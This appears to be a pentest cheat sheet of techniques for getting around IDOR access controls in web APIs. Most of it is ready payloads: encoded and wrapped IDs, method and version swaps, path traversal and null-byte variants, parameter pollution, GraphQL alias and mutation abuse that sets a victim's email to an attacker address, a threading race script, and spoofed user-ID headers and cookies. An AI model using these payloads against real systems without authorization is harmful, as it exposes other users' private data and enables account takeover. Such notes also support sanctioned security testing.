---
tags:
  - high
  - logic
---

# IDOR Bypasses

Your ID swap is blocked. Here's how to get around it.

---

## ID Format Manipulation

### Encoding Variations

```bash
# Different encodings of same ID
id=123
id=00123          # Zero-padded
id=0x7B           # Hex
id=0173           # Octal (careful with leading zeros)
id=%31%32%33      # URL encoded
id=MTIz           # Base64
```

### Negative Numbers

```bash
id=-1             # Sometimes returns first record
id=-123           # May bypass unsigned int checks
```

### Array Syntax

```bash
# Single → Array
id=123
id[]=123
id[0]=123

# Multiple values
id[]=123&id[]=124
```

### Object Wrapping

```json
// Original
{"id": "123"}

// Try wrapping
{"id": {"value": "123"}}
{"id": ["123"]}
{"user": {"id": "123"}}
{"data": {"id": "123"}}
```

---

## HTTP Method Variations

```bash
GET /users/124    → 403 Forbidden
POST /users/124   → 200 OK?
PUT /users/124    → 200 OK?
PATCH /users/124  → 200 OK?
DELETE /users/124 → 200 OK?

# Or with method override
GET /users/124
X-HTTP-Method-Override: PUT
```

---

## Endpoint Variations

### Version Rollback

```bash
/api/v2/users/124 → 403
/api/v1/users/124 → 200?
/api/users/124    → 200?
```

### Path Variations

```bash
/api/users/124        → 403
/api/users/124/       → 200?  # Trailing slash
/api/users/124.json   → 200?  # Extension
/api/users/./124      → 200?  # Dot segment
/api/users/123/../124 → 200?  # Path traversal
/API/Users/124        → 200?  # Case variation
```

### URL Encoding

```bash
/api/users/124
/api/users/%31%32%34          # URL encoded
/api/users/124%00             # Null byte
/api/users/124%20             # Trailing space
```

---

## Parameter Location

### Move Between Locations

```bash
# Query string blocked, body allowed
GET /api/user?id=123 → blocked
POST /api/user
{"id": 123} → allowed

# Header-based
GET /api/user
X-User-Id: 123

# Cookie-based
Cookie: userId=123
```

### Parameter Pollution

```bash
# Multiple params - server might use last one
?id=123&id=124

# Or first one
?id=124&id=123

# Mixed locations
?id=123 (blocked)
POST body: {"id": 124} (used)
```

---

## Content-Type Manipulation

```bash
# From JSON to form
Content-Type: application/json
{"user_id": 123}

# To form-urlencoded
Content-Type: application/x-www-form-urlencoded
user_id=123

# To multipart
Content-Type: multipart/form-data
--boundary
Content-Disposition: form-data; name="user_id"

123
--boundary--

# To XML
Content-Type: application/xml
<request><user_id>123</user_id></request>
```

---

## Add/Swap IDs

### Add Your Own ID

```json
{"victim_id": 124, "my_id": 123}
```

Sometimes having both IDs bypasses checks (system uses `my_id` for auth, `victim_id` for action).

### Swap Nested IDs

```json
// Original
{
  "user": {"id": 123},
  "target": {"id": 123}
}

// Try
{
  "user": {"id": 123},    # Your ID (auth)
  "target": {"id": 124}   # Victim ID (action)
}
```

---

## GraphQL Bypasses

### Field-Level IDOR

```graphql
query {
  user(id: 123) {  # Your ID (passes auth)
    friend(id: 124) {  # Victim ID
      privateData
    }
  }
}
```

### Alias Abuse

```graphql
query {
  me { id }
  victim: user(id: 124) { email }  # Aliased query
}
```

### Mutation IDOR

```graphql
mutation {
  updateUser(id: 124, input: {
    email: "attacker@evil.com"
  }) {
    success
  }
}
```

---

## Timing/Race Conditions

### TOCTOU (Time-of-Check vs Time-of-Use)

```python
# Send legitimate request
# Quickly follow with modified ID before check completes
import threading

def legit():
    requests.get("/api/users/123", headers=auth)

def exploit():
    requests.get("/api/users/124", headers=auth)

# Race them
t1 = threading.Thread(target=legit)
t2 = threading.Thread(target=exploit)
t1.start()
t2.start()
```

---

## Wildcard/Glob Patterns

```bash
# If endpoint supports wildcards
/api/users/*/profile
/api/users/%/profile
/api/users/12?/profile
```

---

## Case Sensitivity

```bash
# If IDs are case-insensitive
/api/users/abc123
/api/users/ABC123
/api/users/AbC123
```

---

## UUID Manipulation

### Version Confusion

```bash
# UUID v1 (timestamp-based) may be predictable
# Extract timestamp, increment, regenerate

# UUID v4 (random) - try harvesting from:
- Other API responses
- Error messages
- Public profiles
- WebSocket messages
```

### Format Variations

```bash
550e8400-e29b-41d4-a716-446655440000
550E8400-E29B-41D4-A716-446655440000  # Uppercase
550e8400e29b41d4a716446655440000      # No dashes
{550e8400-e29b-41d4-a716-446655440000}  # With braces
```

---

## Header Injection

```http
GET /api/users/me HTTP/1.1
X-Original-User-Id: 124
X-Forwarded-User: 124
X-User-Id: 124
X-Custom-User-Id: 124
```

Some apps trust internal headers for user identification.

---

## Cookie Manipulation

```http
# If multiple user identifiers exist
Cookie: session=YOUR_SESSION; userId=VICTIM_ID; uid=VICTIM_ID
```

Test which cookie actually controls authorization.

---

## Bypass Checklist

- [ ] ID format manipulation (encoding, padding, negative)
- [ ] Array syntax (`id[]`)
- [ ] Object wrapping
- [ ] HTTP method variations
- [ ] API version rollback
- [ ] Path variations (trailing slash, extension)
- [ ] Parameter location (query, body, header, cookie)
- [ ] Content-Type manipulation
- [ ] Add both IDs (yours + victim's)
- [ ] GraphQL field-level IDOR
- [ ] Race conditions
- [ ] Case variations
- [ ] Header injection

---

Bypass working? Move to [Escalation](escalate.md).
